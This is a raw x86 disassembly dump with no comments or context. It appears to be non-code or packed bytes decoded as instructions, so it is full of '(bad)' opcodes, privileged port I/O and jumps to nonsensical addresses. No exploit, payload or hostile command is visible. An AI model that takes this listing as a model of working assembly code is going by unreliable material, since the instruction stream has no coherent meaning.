  43c3f8:	add    edx,DWORD PTR [ebp+eax*1-0x50131eca]
  43c3ff:	pusha  
  43c400:	cwde   
  43c401:	jecxz  0x43c3b7
  43c403:	outs   dx,DWORD PTR ds:[esi]
  43c404:	enter  0x1d2b,0xf5
  43c408:	test   DWORD PTR [esi],ebx
  43c40a:	push   cs
  43c40b:	pop    ebp
  43c40c:	sbb    ecx,edx
  43c40e:	or     esp,edi
  43c410:	in     al,dx
  43c411:	jb     0x43c41a
  43c413:	ins    BYTE PTR es:[edi],dx
  43c414:	ror    BYTE PTR [ebx],1
  43c416:	mov    ah,0x71
  43c418:	cwde   
  43c419:	add    esi,DWORD PTR [esi+0x1431f12]
  43c41f:	ins    BYTE PTR es:[edi],dx
  43c420:	inc    ebx
  43c421:	pusha  
  43c422:	hlt    
  43c423:	pop    ecx
  43c424:	cwde   
  43c425:	jmp    0x43c3dc
  43c427:	push   ecx
  43c428:	cwde   
	...
  43c441:	add    bl,dh
  43c443:	mov    cl,0xbe
  43c445:	add    esp,ebx
  43c447:	out    dx,eax
  43c448:	inc    edx
  43c449:	push   ds
  43c44a:	into   
  43c44b:	jp     0x43c46d
  43c44d:	mov    dh,0xdb
  43c44f:	or     BYTE PTR [eax],al
  43c451:	outs   dx,DWORD PTR ds:[esi]
  43c452:	fimul  DWORD PTR [edx]
  43c454:	pop    edx
  43c455:	arpl   WORD PTR [esi],si
  43c457:	mov    bh,0xc8
  43c459:	sub    esi,ebx
  43c45b:	add    al,0x55
  43c45d:	jb     0x43c432
  43c45f:	mov    gs,ebx
  43c461:	std    
  43c462:	jbe    0x43c40c
  43c464:	sti    
  43c465:	jmp    0xe18844b0
  43c46a:	inc    edi
  43c46b:	or     dh,BYTE PTR [ebp+edx*8+0x64]
  43c46f:	enter  0x99f7,0x64
  43c473:	enter  0x99fb,0x1f
  43c477:	fisttp DWORD PTR [edx-0x1a]
  43c47a:	or     DWORD PTR [ecx-0x2113aa41],ecx
  43c480:	mov    edi,0x44862dc2
  43c485:	rcr    DWORD PTR [ebp-0x38],1
  43c488:	sti    
  43c489:	push   0xffffff93
  43c48b:	sbb    edi,edi
  43c48d:	imul   ebx,DWORD PTR [ebx-0x276800ef],0xd434fabd
  43c497:	add    BYTE PTR [ebp+edx*4+0x60],0x25
  43c49c:	cld    
  43c49d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43c49e:	add    DWORD PTR [ebx],ecx
  43c4a0:	cli    
  43c4a1:	sbb    al,0xd4
  43c4a3:	xchg   edi,edx
  43c4a5:	add    DWORD PTR [eax],0x0
	...
  43c4bf:	mov    ds:0x7c86fa88,al
  43c4c4:	ss jae 0x43c49e
  43c4c7:	loopne 0x43c461
  43c4c9:	repz jbe 0x43c52f
  43c4cc:	sbb    edx,edi
  43c4ce:	hlt    
  43c4cf:	out    0xf,eax
  43c4d1:	je     0x43c4c8
  43c4d3:	or     BYTE PTR [ecx+0x9595107],dl
  43c4d9:	cli    
  43c4da:	push   esi
  43c4db:	outs   dx,BYTE PTR ds:[esi]
  43c4dc:	xor    al,0xfa
  43c4de:	aam    0x23
  43c4e0:	and    al,0x8b
  43c4e2:	add    BYTE PTR [eax-0x16],bl
  43c4e5:	cmc    
  43c4e6:	mov    cl,BYTE PTR [esi]
  43c4e8:	dec    esi
  43c4e9:	mov    ebx,0x83e67d58
  43c4ef:	icebp  
  43c4f0:	hlt    
  43c4f1:	dec    edx
  43c4f2:	push   edi
  43c4f3:	shl    BYTE PTR [ebx+0x2],cl
  43c4f6:	lea    eax,[eax-0xa24d60c]
  43c4fc:	add    DWORD PTR [edx],esp
  43c4fe:	inc    BYTE PTR [edx]
  43c500:	jge    0x43c4bc
  43c502:	je     0x43c4bc
  43c504:	jmp    0x4bf8bd7c
  43c509:	push   es
  43c50a:	(bad)  
  43c50b:	clc    
  43c50c:	repz add DWORD PTR [ebp+0x55],0x621073e9
  43c514:	inc    ebx
  43c515:	inc    ebx
  43c516:	or     al,0x1d
  43c518:	pop    edi
  43c519:	cld    
  43c51a:	out    0xa9,eax
  43c51c:	jmp    0x43c513
  43c51e:	inc    DWORD PTR [edx+0x73]
  43c521:	out    dx,al
  43c522:	mov    al,BYTE PTR [eax]
	...
  43c53c:	xchg   ebp,eax
  43c53d:	loopne 0x43c586
  43c53f:	test   DWORD PTR [edx-0x7175aa17],eax
  43c545:	dec    ebp
  43c546:	mov    edx,0x8b550851
  43c54c:	add    DWORD PTR [edi+0x81914e6],0x7dda5300
  43c556:	repnz lea ebx,[eax+0x72fff1db]
  43c55d:	pop    eax
  43c55e:	(bad)  
  43c55f:	test   BYTE PTR ds:0x66330008,0xe9
  43c566:	adc    esp,DWORD PTR [esi+ecx*8]
  43c569:	inc    edi
  43c56a:	cli    
  43c56b:	inc    edi
  43c56c:	adc    ah,dh
  43c56e:	cli    
  43c56f:	dec    ebp
  43c571:	jo     0x43c5c8
  43c573:	(bad)  
  43c574:	hlt    
  43c575:	cwde   
  43c576:	adc    bh,ah
  43c578:	sar    DWORD PTR [edx-0x19a3b152],cl
  43c57e:	mov    edi,DWORD PTR [edi]
  43c580:	hlt    
  43c581:	cwde   
  43c582:	sub    ebx,0x4f1bd2bf
  43c588:	mov    bl,0x30
  43c58a:	out    dx,al
  43c58b:	adc    BYTE PTR [esi+ebx*1],dh
  43c58e:	cmp    DWORD PTR [edi-0x7b76a2d8],0xfa1bf0a0
  43c598:	and    al,0x6
  43c59a:	sahf   
  43c59b:	sub    BYTE PTR [edx+0xbf8302],cl
	...
  43c5b9:	or     BYTE PTR [ebp-0x77],cl
  43c5bc:	test   BYTE PTR [eax-0x3b05e9f0],al
  43c5c2:	add    eax,0x226b686a
  43c5c7:	jg     0x43c588
  43c5c9:	call   0xecb7dcca
  43c5ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43c5cf:	mov    esi,0x80a8a403
  43c5d4:	repz dec ecx
  43c5d6:	inc    edx
  43c5d7:	push   ss
  43c5d8:	dec    edi
  43c5d9:	dec    esp
  43c5da:	fst    QWORD PTR [esi]
  43c5dc:	cli    
  43c5dd:	cmp    esp,DWORD PTR [edi+0x51798c3b]
  43c5e3:	sbb    dl,bh
  43c5e5:	sub    ecx,ebp
  43c5e7:	sub    ebp,DWORD PTR [ebx]
  43c5e9:	int    0x6b
  43c5eb:	push   ss
  43c5ec:	pop    edx
  43c5ed:	outs   dx,BYTE PTR ds:[esi]
  43c5ee:	pop    esi
  43c5ef:	mov    edx,0xfe2136c8
  43c5f4:	push   esp
  43c5f5:	jg     0x43c668
  43c5f7:	test   bl,ch
  43c5f9:	fcomp  DWORD PTR [edi]
  43c5fb:	(bad)  
  43c5fc:	jmp    DWORD PTR [edx+0x9f2bea]
  43c602:	fwait
  43c603:	push   ss
  43c604:	test   DWORD PTR gs:[esi+edx*1],0x57123c36
  43c60c:	xchg   ecx,edx
  43c60e:	add    eax,0x9139f0dd
  43c613:	fild   WORD PTR [edx+0x30]
  43c616:	or     eax,0x4f403ea
  43c61b:	dec    esi
  43c61c:	hlt    
	...
  43c635:	add    BYTE PTR [esi-0xbffcf40],dh
  43c63b:	add    al,0xe9
  43c63d:	test   BYTE PTR cs:[ecx-0x55],0x1b
  43c642:	mov    eax,ds:0x1203e80a
  43c647:	push   es
  43c648:	rcl    DWORD PTR fs:[ebp+0x12037eb5],0x6
  43c650:	mov    eax,ds:0xf9f7e92b
  43c655:	sbb    dl,BYTE PTR [ecx]
  43c657:	fist   DWORD PTR [eax+0x4c07ca1]
  43c65d:	mov    DWORD PTR [eax+0x29],esi
  43c660:	jecxz  0x43c67c
  43c662:	pop    esi
  43c663:	mov    ch,0x6d
  43c665:	shl    BYTE PTR [ebx-0x8],0xe8
  43c669:	add    esi,esp
  43c66b:	add    BYTE PTR [ecx],bh
  43c66d:	mov    DWORD PTR [eax+0x7b5a1820],esi
  43c673:	and    eax,0x9ea60425
  43c678:	call   0xa9c701a8
  43c67d:	sbb    dh,BYTE PTR [edx+0xd]
  43c680:	imul   ebx,DWORD PTR [edx],0xffffffa8
  43c683:	add    bh,dl
  43c685:	inc    ebx
  43c686:	adc    bl,dl
  43c688:	arpl   ax,ax
  43c68a:	and    esi,DWORD PTR [ebp-0x1d85d3ce]
  43c690:	sbb    BYTE PTR [edx],0x77
  43c693:	inc    ebp
  43c694:	repz hlt 
  43c696:	xchg   ecx,eax
  43c697:	cld    
  43c698:	jmp    DWORD PTR [ebx+0x0]
	...
  43c6b3:	mov    ah,0x19
  43c6b5:	gs jmp 0xb957d562
  43c6bb:	in     eax,0xc9
  43c6bd:	jmp    FWORD PTR [ecx+0x1b]
  43c6c0:	(bad)  
  43c6c1:	cli    
  43c6c2:	fsub   st(7),st
  43c6c4:	js     0x43c70a
  43c6c6:	pop    ecx
  43c6c7:	xchg   DWORD PTR [esi+0x1cefc486],esi
  43c6cd:	xchg   esi,eax
  43c6ce:	neg    ch
  43c6d0:	push   cs
  43c6d1:	pop    edx
  43c6d2:	xchg   edi,eax
  43c6d3:	inc    eax
  43c6d4:	dec    eax
  43c6d5:	add    ebp,ecx
  43c6d7:	xor    edi,DWORD PTR [esi]
  43c6d9:	retf   
  43c6da:	xor    eax,0x2dcb3e3b
  43c6df:	xor    edi,DWORD PTR [esi]
  43c6e1:	retf   
  43c6e2:	mov    esp,0x62501d82
  43c6e7:	mov    ebp,0x839f86ed
  43c6ec:	lahf   
  43c6ed:	add    BYTE PTR [esp+esi*4+0xe],ch
  43c6f1:	dec    edi
  43c6f2:	sahf   
  43c6f3:	test   al,0xe
  43c6f5:	int    0x6a
  43c6f7:	sub    edi,edx
  43c6f9:	jle    0x43c6dc
  43c6fb:	test   DWORD PTR [edi-0x3f3a11f6],0x13b62fa
  43c705:	mov    eax,ebp
  43c707:	and    BYTE PTR [ecx-0x7a],cl
  43c70a:	int3   
  43c70b:	mov    ecx,DWORD PTR [edx-0x7a]
  43c70e:	pop    ss
  43c70f:	cmp    al,0x82
  43c711:	inc    ecx
  43c712:	shl    DWORD PTR [edi+esi*4-0x6],1
  43c716:	cdq    
	...
  43c72f:	add    BYTE PTR [ecx+0x45],dh
  43c732:	pop    es
  43c733:	sahf   
  43c734:	loopne 0x43c728
  43c736:	mov    edi,0xbea8fb72
  43c73b:	cmp    al,0x81
  43c73d:	sbb    eax,0xb6463a50
  43c742:	xchg   BYTE PTR [eax],al
  43c744:	jne    0x43c6c7
  43c746:	inc    ebx
  43c747:	cld    
  43c748:	xchg   ch,dh
  43c74a:	dec    edx
  43c74b:	(bad)  
  43c74c:	and    ch,ch
  43c74e:	cli    
  43c74f:	(bad)  
  43c750:	fld    QWORD PTR [eax+ebp*8]
  43c753:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43c754:	pop    edx
  43c755:	out    dx,al
  43c756:	cmc    
  43c757:	mov    ebx,DWORD PTR [eax-0x1e3b8610]
  43c75d:	xchg   DWORD PTR [edx+0x4b7ff175],edi
  43c763:	cld    
  43c764:	pop    esp
  43c765:	fmul   QWORD PTR [edi+edi*8-0x3b861206]
  43c76c:	mov    eax,ds:0xc175ba87
  43c771:	jns    0x43c7c6
  43c773:	cld    
  43c774:	es inc eax
  43c776:	add    bl,BYTE PTR [edi-0x34]
  43c779:	fiadd  WORD PTR [edx]
  43c77b:	or     ecx,esi
  43c77d:	dec    edx
  43c77e:	xchg   DWORD PTR [ecx],edx
  43c780:	inc    esi
  43c781:	jns    0x43c766
  43c783:	pop    ebp
  43c784:	into   
  43c785:	jns    0x43c7da
  43c787:	or     BYTE PTR [edx+0x4e],bl
  43c78a:	mov    ebp,0x45d02
  43c78f:	add    BYTE PTR [esi+0x5de379],al
	...
  43c7ad:	mov    es,eax
  43c7af:	(bad)  
  43c7b0:	int3   
  43c7b1:	mov    eax,eax
  43c7b3:	(bad)  
  43c7b4:	int3   
  43c7b5:	adc    BYTE PTR [edx-0x1a],bh
  43c7b8:	push   ecx
  43c7b9:	push   cs
  43c7ba:	push   ebx
  43c7bb:	dec    ebp
  43c7bc:	mov    esi,DWORD PTR ds:0xc6fc437f
  43c7c2:	repnz dec edx
  43c7c4:	(bad)  
  43c7c5:	loopne 0x43c7b3
  43c7c7:	cli    
  43c7c8:	call   FWORD PTR ds:0x5a45e804
  43c7ce:	in     eax,dx
  43c7cf:	cmc    
  43c7d0:	mov    ecx,eax
  43c7d2:	in     al,dx
  43c7d3:	jns    0x43c799
  43c7d5:	hlt    
  43c7d6:	sbb    DWORD PTR [ebx-0x76a18e28],ecx
  43c7dc:	or     dh,BYTE PTR [ecx-0x2f]
  43c7df:	pop    ss
  43c7e0:	push   eax
  43c7e1:	or     al,0x4e
  43c7e3:	pop    ss
  43c7e4:	cli    
  43c7e5:	repz mov ds:0x6177fbc1,al
  43c7eb:	cli    
  43c7ec:	xchg   ch,al
  43c7ee:	fsub   QWORD PTR [edi+eax*1]
  43c7f1:	out    dx,eax
  43c7f2:	ret    
  43c7f3:	jns    0x43c7b4
  43c7f5:	dec    ecx
  43c7f6:	pop    ds
  43c7f7:	add    DWORD PTR [eax+ecx*8+0x4d],0xbec31126
  43c7ff:	pop    ss
  43c800:	xchg   BYTE PTR [ecx],ch
  43c802:	retf   0xc383
  43c805:	clc    
  43c806:	fcomp  QWORD PTR ds:0x79f4ff0f
  43c80c:	mov    edi,0x4c813a29
	...
  43c829:	add    BYTE PTR [eax-0x6d06d9b4],bl
  43c82f:	out    dx,al
  43c830:	pop    ss
  43c831:	jle    0x43c7e3
  43c833:	and    DWORD PTR [ecx-0x41],edi
  43c836:	or     DWORD PTR [edx],ebp
  43c838:	mov    edx,DWORD PTR [eax+edi*2-0x6e]
  43c83c:	rol    DWORD PTR [edi],0xd3
  43c83f:	fsub   QWORD PTR [edi+edx*1]
  43c842:	imul   edx
  43c844:	mov    eax,0x86c30588
  43c849:	in     al,0xb9
  43c84b:	pop    edx
  43c84c:	xchg   BYTE PTR [esp+edi*8-0x32],dl
  43c850:	mov    cl,0xc2
  43c852:	neg    BYTE PTR ds:0xe2f4fffe
  43c858:	xchg   ah,ah
  43c85a:	cdq    
  43c85b:	pop    edx
  43c85c:	inc    edi
  43c85d:	retf   
  43c85e:	inc    eax
  43c85f:	call   0x49bbb3ea
  43c864:	pop    es
  43c865:	dec    edi
  43c866:	retf   0x3a04
  43c869:	mov    esp,DWORD PTR [ebx]
  43c86b:	jns    0x43c890
  43c86d:	sbb    BYTE PTR [edx+0x15],bh
  43c870:	cmp    BYTE PTR [edi],bh
  43c872:	mov    al,0x8
  43c874:	call   0x9148bc7c
  43c879:	push   ebx
  43c87a:	std    
  43c87b:	push   es
  43c87c:	jns    0x43c809
  43c87e:	mov    ebx,0x8c182b7a
  43c883:	and    BYTE PTR [eax+eax*1-0x4e90d285],0xe3
  43c88b:	sub    BYTE PTR [edi],0x91
	...
  43c8a6:	add    ch,bh
  43c8a8:	ja     0x43c84d
  43c8aa:	pop    ss
  43c8ab:	and    al,0x1d
  43c8ad:	jo     0x43c8c5
  43c8af:	mov    esi,0xf7406506
  43c8b4:	jns    0x43c8e6
  43c8b6:	mov    edi,DWORD PTR [eax]
  43c8b8:	or     DWORD PTR [edi+0x7],ecx
  43c8bb:	push   eax
  43c8bc:	inc    ebx
  43c8bd:	loopne 0x43c8cb
  43c8bf:	dec    ecx
  43c8c0:	or     eax,0xf9f32427
  43c8c5:	inc    eax
  43c8c6:	cmp    DWORD PTR [eax+edx*4+0x92088e2],0x7052bb6
  43c8d1:	add    DWORD PTR [edi],edx
  43c8d3:	cli    
  43c8d4:	inc    eax
  43c8d5:	in     al,0x8a
  43c8d7:	cmp    edi,DWORD PTR [edx-0x55]
  43c8da:	pop    ss
  43c8db:	mov    esi,?
  43c8dd:	inc    esp
  43c8de:	inc    edx
  43c8df:	repz sti 
  43c8e1:	cmp    ebx,DWORD PTR [esp+esi*1]
  43c8e4:	and    eax,0x802c0af8
  43c8e9:	lahf   
  43c8ea:	nop
  43c8eb:	std    
  43c8ec:	ja     0x43c911
  43c8ee:	sbb    BYTE PTR [ebx+0x3e161c1c],dh
  43c8f4:	push   es
  43c8f5:	gs aas 
  43c8f7:	idiv   DWORD PTR [ecx-0x1]
  43c8fa:	mov    al,ds:0x50fbc17e
  43c8ff:	cli    
  43c900:	pusha  
  43c901:	mov    ebp,0xf7afe901
  43c906:	test   al,0xd7
  43c908:	in     eax,dx
  43c909:	push   es
  43c90a:	mov    cl,0x0
	...
  43c924:	je     0x43c963
  43c926:	je     0x43c907
  43c928:	ins    BYTE PTR es:[edi],dx
  43c929:	mov    ecx,0xd7c818fb
  43c92e:	stc    
  43c92f:	jle    0x43c93b
  43c931:	xchg   ebx,eax
  43c933:	in     eax,dx
  43c934:	jle    0x43c973
  43c936:	xchg   BYTE PTR [esp+edi*8],ah
  43c939:	ins    BYTE PTR es:[edi],dx
  43c93a:	or     BYTE PTR [edi+edi*8-0x62b3780],ch
  43c941:	ja     0x43c997
  43c943:	push   ebp
  43c944:	test   DWORD PTR ds:0xaea4f18,ebx
  43c94a:	jle    0x43c979
  43c94c:	mov    ebx,0xb472c77e
  43c951:	or     DWORD PTR [eax+0x8fdd728],ebx
  43c957:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43c958:	inc    DWORD PTR [eax+0x77f19cc8]
  43c95e:	inc    esp
  43c95f:	sbb    eax,0x14fc1d47
  43c964:	loop   0x43c970
  43c966:	jle    0x43c98d
  43c968:	cmp    DWORD PTR [esi-0x39],0x72
  43c96c:	mov    ah,0x9
  43c96e:	cwde   
  43c96f:	sub    BYTE PTR [edi],dl
  43c971:	test   BYTE PTR [eax],0xac
  43c974:	jno    0x788a3e42
  43c97a:	dec    esp
  43c97b:	in     eax,0xa7
  43c97d:	sbb    eax,0xae9dce0
  43c982:	xchg   BYTE PTR [ecx+0x64034175],ah
	...
  43c9a0:	add    BYTE PTR [edi-0x39ffdf70],ch
  43c9a6:	inc    ebp
  43c9a7:	neg    BYTE PTR [ecx+0x4581d0a6]
  43c9ad:	adc    eax,0x5e0bf034
  43c9b2:	rcr    esp,0x18
  43c9b5:	es push esi
  43c9b7:	repnz pop edi
  43c9b9:	test   BYTE PTR [eax],dh
  43c9bb:	pop    eax
  43c9bc:	mov    ebp,ecx
  43c9be:	add    al,0x83
  43c9c0:	rol    esi,0x7b
  43c9c3:	jecxz  0x43ca22
  43c9c5:	dec    esi
  43c9c6:	jnp    0x43ca0b
  43c9c8:	or     BYTE PTR [edx],dl
  43c9ca:	mov    ebx,0x8dd00be
  43c9cf:	add    BYTE PTR [eax],al
  43c9d1:	call   0x8:0xcdfffdc9
  43c9d8:	mov    ebx,DWORD PTR [esi+edi*4]
  43c9db:	and    ch,0x80
  43c9de:	inc    ebp
  43c9df:	(bad)
  43c9e2:	dec    esp
  43c9e3:	(bad)
  43c9e6:	dec    ebp
  43c9e7:	(bad)
  43c9ea:	dec    esp
  43c9eb:	(bad)
  43c9ee:	(bad)  
  43c9ef:	in     eax,0x83
  43c9f1:	loope  0x43c9d7
  43c9f3:	dec    edx
  43c9f4:	mov    esi,DWORD PTR [eax+0x6574e0c]
  43c9fa:	pushf  
  43c9fb:	add    DWORD PTR [ebx],esi
  43c9fd:	jmp    0x43c9ad
  43c9ff:	sti    
  43ca00:	push   ebp
  43ca01:	dec    ebx
  43ca02:	mov    ch,0x4e
  43ca04:	mov    DWORD PTR [eax],0x0
	...
  43ca1e:	dec    eax
  43ca1f:	adc    al,0xf6
  43ca21:	call   FWORD PTR [ebp+0x8]
  43ca24:	xchg   DWORD PTR [ebp+0x65],esi
  43ca27:	(bad)  
  43ca28:	je     0x43ca0e
  43ca2a:	aam    0x93
  43ca2c:	loope  0x43ca16
  43ca2e:	jns    0x43ca0a
  43ca30:	stc    
  43ca31:	(bad)  
  43ca32:	fiadd  WORD PTR [ebx+0xd]
  43ca35:	test   esp,esi
  43ca37:	lods   eax,DWORD PTR ds:[esi]
  43ca38:	mov    DWORD PTR [esi],eax
  43ca3a:	mov    ds:0x7bfcf33,eax
  43ca3f:	mov    al,ds:0x211986b8
  43ca44:	aas    
  43ca45:	dec    esi
  43ca46:	ret    
  43ca47:	lds    ebx,FWORD PTR [eax]
  43ca49:	cmp    esp,esi
  43ca4b:	in     eax,dx
  43ca4c:	mov    ch,dh
  43ca4e:	ja     0x43ca02
  43ca50:	add    eax,0xb2752c87
  43ca55:	fstp   TBYTE PTR [ebp+0x19]
  43ca58:	and    al,0x84
  43ca5a:	add    ebx,DWORD PTR [ebx]
  43ca5c:	out    dx,al
  43ca5d:	ins    DWORD PTR es:[edi],dx
  43ca5e:	in     al,dx
  43ca5f:	ins    BYTE PTR es:[edi],dx
  43ca60:	sbb    dl,bh
  43ca62:	repz in eax,dx
  43ca64:	std    
  43ca65:	outs   dx,BYTE PTR ds:[esi]
  43ca66:	cld    
  43ca67:	fs mov dl,0xf3
  43ca6a:	ins    DWORD PTR es:[edi],dx
  43ca6b:	lock adc eax,0xf9d5e386
  43ca71:	add    esi,esp
  43ca73:	in     eax,dx
  43ca74:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43ca75:	add    BYTE PTR [esi-0x12],bl
  43ca78:	adc    al,0x14
  43ca7a:	loopne 0x43ca9d
  43ca7c:	sar    bh,0x76
  43ca7f:	xor    DWORD PTR [ecx],eax
  43ca81:	mov    DWORD PTR [eax],eax
	...
  43ca9b:	cmp    DWORD PTR [edx+0x7a],eax
  43ca9e:	mov    edi,0xc8d08020
  43caa3:	pop    esi
  43caa4:	jmp    0xe738caa6
  43caa9:	inc    ebx
  43caaa:	or     bh,BYTE PTR [ebx+0x19]
  43caad:	std    
  43caae:	push   esp
  43cab0:	mov    dx,0x6f3
  43cab4:	icebp  
  43cab5:	fmul   st,st(7)
  43cab7:	jmp    0x43cb27
  43cab9:	sbb    al,0xff
  43cabb:	jae    0x43caaa
  43cabd:	sub    BYTE PTR [esi],cl
  43cabf:	test   BYTE PTR [esi-0x4e],ah
  43cac2:	fld    TBYTE PTR [edi+0x78]
  43cac5:	adc    eax,0xd304c186
  43caca:	jg     0x43ca8c
  43cacc:	hlt    
  43cacd:	outs   dx,BYTE PTR ds:[esi]
  43cace:	xchg   ecx,eax
  43cacf:	sub    ecx,DWORD PTR [edi-0x398be7d4]
  43cad5:	out    0x7,eax
  43cad7:	hlt    
  43cad8:	add    al,0x66
  43cada:	xor    eax,0x96a93e33
  43cadf:	std    
  43cae0:	jnp    0x43cacd
  43cae2:	into   
  43cae3:	xor    edi,DWORD PTR [edx-0x21]
  43cae6:	jl     0x43ca98
  43cae8:	lock jo 0x43ca84
  43caeb:	and    ebp,edi
  43caed:	loope  0x43cb6b
  43caef:	mov    al,ds:0x13c160f0
  43caf4:	(bad)  
  43caf5:	and    al,0x24
  43caf7:	jb     0x43caf0
  43caf9:	into   
  43cafa:	cwde   
  43cafb:	fisttp WORD PTR [esi+0xefae]
	...
  43cb15:	add    BYTE PTR [eax],al
  43cb17:	add    BYTE PTR [eax-0xb],ch
  43cb1a:	mov    esi,0x64ca0a41
  43cb1f:	inc    esp
  43cb20:	dec    ecx
  43cb21:	adc    al,0xda
  43cb23:	sti    
  43cb24:	je     0x43cb22
  43cb26:	jecxz  0x43cb2f
  43cb28:	hlt    
  43cb29:	add    al,0xd9
  43cb2b:	or     cl,BYTE PTR [ebx-0xbfc1cf7]
  43cb31:	in     eax,dx
  43cb32:	in     eax,0xde
  43cb34:	int    0x8e
  43cb36:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43cb37:	push   DWORD PTR [edx+0x50]
  43cb3a:	fistp  WORD PTR [ebp-0x4c6ea45d]
  43cb40:	inc    esp
  43cb41:	in     eax,dx
  43cb42:	cmp    edx,ecx
  43cb44:	xchg   ebx,eax
  43cb45:	add    ah,BYTE PTR [edi+0x48]
  43cb48:	out    0x87,eax
  43cb4a:	daa    
  43cb4b:	cdq    
  43cb4c:	add    al,0x8e
  43cb4e:	mov    ah,0xf
  43cb50:	jb     0x43cb9a
  43cb52:	repz mov dh,0xc1
  43cb55:	push   esp
  43cb56:	outs   dx,BYTE PTR ds:[esi]
  43cb57:	leave  
  43cb58:	repz lea eax,[eax]
  43cb5b:	mov    eax,ds:0xe5508b53
  43cb60:	mov    al,ds:0xbb6aceff
  43cb65:	adc    DWORD PTR ds:0x8b596caa,esi
  43cb6b:	sub    ah,ch
  43cb6d:	mov    al,al
  43cb6f:	dec    edi
  43cb70:	sbb    al,0x8b
  43cb72:	dec    ebx
  43cb73:	lds    ebp,FWORD PTR [edi-0x7e]
  43cb76:	cmp    al,0xf1
  43cb78:	addr16 jns 0x43cb8e
  43cb7b:	imul   eax,DWORD PTR [eax],0x0
	...
  43cb95:	jae    0x43cba1
  43cb97:	jmp    DWORD PTR [ecx]
  43cb99:	jge    0x43cba7
  43cb9b:	and    BYTE PTR ds:0x14050010,0xff
  43cba2:	test   BYTE PTR [ecx+eiz*8-0x6],bh
  43cba6:	push   es
  43cba7:	je     0x43cb90
  43cba9:	ins    BYTE PTR es:[edi],dx
  43cbaa:	ret    0xa479
  43cbad:	adc    cl,BYTE PTR [edi]
  43cbaf:	xchg   edi,eax
  43cbb0:	jmp    0xe5ac:0x60d1133d
  43cbb7:	add    eax,0xe85958ab
  43cbbc:	fsubr  st(1),st
  43cbbe:	mov    al,BYTE PTR [ebx+0x61]
  43cbc1:	mov    eax,0x79e6f048
  43cbc6:	daa    
  43cbc7:	stc    
  43cbc8:	dec    esi
  43cbc9:	out    0x76,al
  43cbcb:	or     al,0x72
  43cbcd:	mov    ah,0xf5
  43cbcf:	aaa    
  43cbd0:	lods   al,BYTE PTR ds:[esi]
  43cbd1:	or     ecx,DWORD PTR [edi]
  43cbd3:	jle    0x43cbaa
  43cbd5:	push   es
  43cbd6:	(bad)  
  43cbd7:	stc    
  43cbd8:	bound  ebx,QWORD PTR [ebp+edi*8+0x4e]
  43cbdc:	xchg   ebx,eax
  43cbdd:	idiv   ebp
  43cbdf:	adc    ecx,ecx
  43cbe1:	retf   
  43cbe2:	inc    edx
  43cbe3:	add    BYTE PTR [edx-0x54],ah
  43cbe6:	in     eax,0x85
  43cbe8:	mov    ah,0xdf
  43cbea:	add    ah,0x0
  43cbed:	gs mov dh,0x57
  43cbf0:	pop    ebx
  43cbf1:	out    0x2c,al
  43cbf3:	pop    esp
  43cbf4:	ret    
  43cbf5:	add    BYTE PTR [edx+0x83e5],0x0
	...
  43cc10:	add    BYTE PTR [eax],al
  43cc12:	pop    ecx
  43cc13:	jmp    0x5750:0xb88b4a
  43cc1a:	(bad)  
  43cc1b:	xchg   ecx,eax
  43cc1c:	add    eax,0xfba22333
  43cc21:	push   ebp
  43cc22:	add    edi,DWORD PTR [edx+ecx*2-0x9e31f39]
  43cc29:	call   FWORD PTR ds:0x65758705
  43cc2f:	jge    0x43cca5
  43cc31:	in     al,0x94
  43cc33:	cdq    
  43cc34:	loope  0x43cc1e
  43cc36:	adc    edx,edx
  43cc38:	stc    
  43cc39:	call   FWORD PTR [esi+0x4d850d4c]
  43cc3f:	pushf  
  43cc40:	add    bl,BYTE PTR [edi-0x35]
  43cc43:	xlat   BYTE PTR ds:[ebx]
  43cc44:	mov    ecx,0x82b28f33
  43cc49:	in     eax,0x8
  43cc4b:	dec    edx
  43cc4c:	dec    esi
  43cc4d:	push   ebx
  43cc4e:	jne    0x43cc02
  43cc50:	cmp    al,0x0
  43cc52:	int    0x89
  43cc54:	mov    ebp,0x88314608
  43cc59:	pop    ebp
  43cc5a:	or     DWORD PTR [esp+edx*2-0x20],edi
  43cc5e:	push   eax
  43cc5f:	aaa    
  43cc60:	outs   dx,BYTE PTR ds:[esi]
  43cc61:	adc    bl,BYTE PTR [edi+0x3afb80fc]
  43cc67:	push   ss
  43cc68:	stc    
  43cc69:	jmp    FWORD PTR [esi-0x4]
  43cc6c:	mov    BYTE PTR [ebp-0x1f],bl
  43cc6f:	jnp    0x43ccc5
  43cc71:	clc    
  43cc72:	push   ss
  43cc73:	pop    ss
  43cc74:	popa   
  43cc75:	add    al,0x0
	...
  43cc8f:	mov    eax,ds:0x9c6a0004
  43cc94:	mov    ds:0xf4fef9,al
  43cc99:	jmp    0xc3:0x84ee37cb
  43cca0:	jne    0x43cc63
  43cca2:	sti    
  43cca3:	jno    0x43ccd3
  43cca5:	cwde   
  43cca6:	mov    bl,0x27
  43cca8:	and    eax,0xedf4034a
  43ccad:	std    
  43ccae:	ss inc edx
  43ccb0:	test   DWORD PTR [eax-0x2120b08],0x93e1b986
  43ccba:	sbb    edi,edi
  43ccbc:	mov    ebp,0xee207f00
  43ccc1:	std    
  43ccc2:	call   FWORD PTR [edi]
  43ccc4:	fdivr  QWORD PTR [edx+0x48]
  43ccc7:	hlt    
  43ccc8:	bound  ebp,QWORD PTR [edx+0xc396fdb]
  43ccce:	xchg   BYTE PTR [ecx+0x44c7c99],ch
  43ccd4:	jae    0x43cc98
  43ccd6:	repz jne 0x43cc85
  43ccd9:	std    
  43ccda:	add    esi,esp
  43ccdc:	in     eax,dx
  43ccdd:	test   al,dl
  43ccdf:	hlt    
  43cce0:	ret    0x6d3f
  43cce3:	cli    
  43cce4:	test   BYTE PTR [ecx],0x37
  43cce7:	(bad)  
  43cce8:	push   ebp
  43ccea:	mov    BYTE PTR [ecx],dh
  43ccec:	xor    BYTE PTR [esi+0x74],0xc4
  43ccf0:	push   edx
  43ccf1:	pop    es
  43ccf2:	mov    DWORD PTR [eax],eax
	...
  43cd0c:	and    DWORD PTR [edx+0x76],edx
  43cd0f:	dec    esp
  43cd10:	les    esp,FWORD PTR [edx-0x76]
  43cd13:	fild   QWORD PTR [edi-0x58]
  43cd16:	sbb    eax,0x9112a786
  43cd1b:	jmp    0x43cd9c
